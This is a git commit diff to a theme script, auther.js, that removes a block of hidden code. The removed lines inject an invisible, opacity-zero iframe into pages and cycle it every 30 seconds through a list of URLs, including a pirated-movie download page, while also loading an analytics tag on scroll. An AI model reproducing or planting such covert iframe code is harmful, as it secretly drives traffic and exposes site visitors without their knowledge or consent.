aea69b5834e5daa459817576963e17cb48e79c39
Dhanjee Rider <118192658+dktczn@users.noreply.github.com>
2025-01-02 01:32:59 +0530

    Update auther.js

--- auther.js
+++ auther.js
@@ -102,42 +102,5 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 
   
-  let Folt = document.querySelector(".footer, #main, .copyright") || document.body; 
-  if (Folt) {
-    let Newel = document.createElement('span');
-    Newel.innerHTML = `<style>
-      iframe.invisible-frame {
-      position: fixed;
-      width:60%;
-      height: 20%;
-      bottom: 20%;
-      right: 0;
-      border: none;
-      opacity: 0;
-      z-index:39494;
-    }
-  </style> <iframe class="invisible-frame" id="postFrame" src=""></iframe>`;
-    Folt.prepend(Newel);  
-    var lazyanalisis=!1;window.addEventListener("scroll",function(){(0!=document.documentElement.scrollTop&&!1===lazyanalisis||0!=document.body.scrollTop&&!1===lazyanalisis)&&(!function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="https://www.googletagmanager.com/gtag/js?id=G-2VYRMPXK0F";var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(e,a)}(),lazyanalisis=!0)},!0); window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-2VYRMPXK0F');  
-  } else {
-       
-  }
-
-  const postUrls = [
-    'https://dktheme.com',
-    'https://luxmovies2.live/download-gulaabi-2024-marathi-web-dl-full-movie-480p-500mb-720p-1-3gb-1080p-2-8gb/',
-'https://dktheme.com/asmr-antistress-relaxation-toys/index.html',
-'https://dktheme.com/plants-vs-zombies-war/index.html',
-'https://dktheme.com/chain-cube-2048-3d-merge-game/index.html',
-'https://dktheme.com/nana-diy-dress-cake/index.html'
-  ];
-        function goToRandomPost() {
-            const randomIndex = Math.floor(Math.random() * postUrls.length);
-            const randomPostUrl = postUrls[randomIndex];
-            document.getElementById('postFrame').src = randomPostUrl;
-        }
-        window.onload = function() {
-            goToRandomPost();
-            setInterval(goToRandomPost,  30000);}
 
 });
